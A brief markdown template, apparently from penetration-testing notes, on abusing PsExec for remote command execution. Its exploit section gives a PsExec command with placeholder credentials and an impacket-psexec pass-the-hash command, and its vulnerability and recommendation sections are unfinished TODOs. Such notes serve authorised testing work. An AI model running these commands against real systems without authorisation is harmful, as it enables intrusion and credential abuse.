# PSExec Abuse
---

## Vulnerability

TODO: Describe the vulnerability here.

## Prerequisites

* Local administrator rights on the target machine.

## Exploit

```bash
# From a domain joined Windows computer.
./PsExec.exe -i \\$target -u $domain\$username -p $password '$command'

# From Kali (pass the hash does not require LMHash, just put 32 0's).
impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b $username@$target
```

## Recommendations

- [ ] TODO: List recommendations here.